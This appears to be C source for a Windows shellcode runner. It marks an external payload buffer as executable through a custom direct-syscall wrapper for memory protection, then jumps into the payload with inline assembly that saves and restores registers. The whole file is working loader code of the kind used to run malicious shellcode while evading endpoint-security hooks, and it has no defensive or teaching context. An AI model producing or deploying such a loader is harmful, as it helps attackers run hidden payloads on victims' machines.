#include <Windows.h>
#include <stdio.h>
#include "syscalls_mem.h"

unsigned char cpay_forsize[] = "0xcc";

extern unsigned char cpay[];

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nShowCmd){

    DWORD op; //oldprotect
    MEMORY_BASIC_INFORMATION lpbuffer;

    size_t cpay_size = sizeof(cpay_forsize);
    PVOID baseAddress1 = cpay;
    
    printf("Hello\n");

    HANDLE hProcess = GetCurrentProcess(); //OpenProcess(PROCESS_ALL_ACCESS,TRUE,GetCurrentProcessId());

    NTSTATUS status = myCustomDontProtect(hProcess, &baseAddress1, &cpay_size, PAGE_EXECUTE_READWRITE, &op);

    if (status > 0) {
        printf("Error NTSTATUS: 0x%x\n", status);
        return EXIT_FAILURE;
    }

    asm volatile("lea r14,[%0]" :: "r"(&cpay)); 

    PVOID rtnaddr = NULL;
    asm volatile("lea r15,[rip + returnbackhere]");

    PVOID var_rbx = NULL;
    PVOID var_rbp = NULL;
    PVOID var_rcx = NULL;
    PVOID var_rdi = NULL;
    PVOID var_rsi = NULL;
    PVOID var_rsp = NULL;
    

    asm volatile("mov %0, rbx" : "=r"(var_rbx));
    asm volatile("mov %0, rbp" : "=r"(var_rbp));
    asm volatile("mov %0, rdi" : "=r"(var_rdi));
    asm volatile("mov %0, rsi" : "=r"(var_rsi));
    asm volatile("mov %0, rsp" : "=r"(var_rsp));

    NTSTATUS status1 = payexec();
    asm volatile("returnbackhere:");

    printf("Ciao!\n");

    asm volatile("mov rsp, %0" :: "r"(var_rsp));
    asm volatile("mov rsi, %0" :: "r"(var_rsi));
    asm volatile("mov rdi, %0" :: "r"(var_rdi));
    asm volatile("mov rbp, %0" :: "r"(var_rbp));
    asm volatile("mov rbx, %0" :: "r"(var_rbx));

    getchar();
    return 0;

}
